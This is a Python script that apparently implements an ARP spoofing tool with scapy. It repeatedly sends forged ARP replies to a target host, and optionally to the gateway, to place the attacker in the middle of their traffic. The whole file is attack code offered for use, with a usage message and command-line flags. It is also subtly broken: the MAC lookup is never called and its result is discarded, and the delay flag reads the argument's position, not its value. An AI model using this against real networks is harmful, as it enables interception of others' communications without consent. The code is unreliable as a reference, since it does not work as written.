import scapy.all as scapy
import sys
import time

# to run in linux:
# install scapy globally
# sudo python3 main.py [args]

target_mac = ""
target_ip = ""
spoof_ip = ""
attack_gw = False
interface = None
delay = 2
help_msg = "usage:\n     python ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET\n\nSpoof ARP " \
           "tables\noptional arguments:\n -h, --help                      show this help message and exit\n -i IFACE, " \
           "--iface IFACE        Interface you wish to use\n -s SRC, --src SRC              The address you want for " \
           "the attacker\n -d DELAY, --delay DELAY        Delay (in seconds) between messages\n -gw                   " \
           "         should GW be attacked as well\n -t TARGET, --target TARGET     IP of target "


def get_mac(ip):
    arp_request_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    answered_list = []
    try:
        if interface is not None:
            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False, interface=interface)[0]
        else:
            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    except:
        print("interface is unavailable")
    try:
        target_mac = answered_list[0][1].hwsrc
    except:
        print("no machine found with the given ip")


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    try:
        if interface is not None:
            scapy.send(packet, verbose=False, iface=interface)
        else:
            scapy.send(packet, verbose=False)
    except:
        print("interface is unavailable")


def main():
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, spoof_ip)
            if attack_gw:
                spoof(spoof_ip, target_ip)
            sent_packets_count = sent_packets_count + 1
            print("\r[*] Packets Sent " + str(sent_packets_count), end="")
            time.sleep(delay)

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        print("[+] Arp Spoof Stopped")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "-h" or sys.argv[1] == "--help":
            print(help_msg)
            exit()
        if "-gw" in sys.argv:
            attack_gw = True
        if "-t" in sys.argv or "--target" in sys.argv:
            try:
                target_ip = sys.argv[sys.argv.index("-t") + 1]
            except:
                target_ip = sys.argv[sys.argv.index("--target") + 1]
        if "-d" in sys.argv or "--delay" in sys.argv:
            try:
                delay = int(sys.argv.index("-d"))
            except:
                delay = int(sys.argv.index("--delay"))
        if "-s" in sys.argv or "--src" in sys.argv:
            try:
                spoof_ip = sys.argv[sys.argv.index("-s") + 1]
            except:
                spoof_ip = sys.argv[sys.argv.index("--src") + 1]
        if "-i" in sys.argv or "--iface" in sys.argv:
            try:
                interface = sys.argv[sys.argv.index("-i") + 1]
            except:
                interface = sys.argv[sys.argv.index("--iface") + 1]


    main()
